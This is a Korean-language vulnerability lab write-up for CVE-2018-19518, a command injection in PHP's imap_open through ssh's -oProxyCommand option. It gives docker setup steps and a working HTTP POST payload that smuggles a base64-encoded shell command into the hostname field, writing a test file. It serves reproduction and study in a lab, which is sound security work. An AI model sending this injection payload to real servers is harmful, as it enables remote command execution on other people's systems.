# CVE-2018-19518
## PHP imap 원격 명령 실행 취약성 (CVE-2018-19518)

php imap 확장은 PHP에서 메일 송수신 작업을 수행하는 데 사용됩니다.
`imap_open` 함수는 rsh를 호출하여 원격 shell에 연결합니다. 
debian/ubuntu에서는 rsh 대신 ssh를 사용합니다. 
(즉, debian 계열 시스템에서 rsh 명령을 실행하는 것은 실제로는 ssh 명령입니다.)

ssh 명령에서는 `-oProxyCommand=`를 설정하여 제3자 명령을 호출할 수 있기 때문에 공격자가 이 매개 변수를 삽입하여 궁극적으로 명령 실행 취약성을 초래할 수 있습니다.

참고 자료:
- https://bugs.php.net/bug.php?id=77153
- https://github.com/Bo0oM/PHP_imap_open_exploit
- https://antichat.com/threads/463395/#post-4254681
- https://nvd.nist.gov/vuln/detail/CVE-2018-19518

## 취약 환경

다음 명령을 실행하여 취약성이 있는 PHP 환경을 시작합니다.

```
docker compose up -d
```

환경을 실행한 후, `http://your-ip:8080`을 방문하면 웹 페이지를 볼 수 있습니다. 
웹의 기능은 메일 서버가 성공적으로 연결될 수 있는지 테스트하는 것입니다. 
서버 주소, 사용자 이름 및 암호를 입력해야 합니다.

코드 원본: [index.php](www/index.php)

## 반복될 수 있는 취약점

다음과 같은 패킷을 보내면 명령어 `echo'1234567890'>/tmp/test0001`을 성공적으로 실행할 수 있습니다.

```
POST / HTTP/1.1
Host: your-ip
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 125

hostname=x+-oProxyCommand%3decho%09ZWNobyAnMTIzNDU2Nzg5MCc%2bL3RtcC90ZXN0MDAwMQo%3d|base64%09-d|sh}&username=111&password=222
```

`docker compose exec web bash` 를 실행하면 `/tmp/test0001` 가 성공적으로 생성되었습니다:
![](1.png)
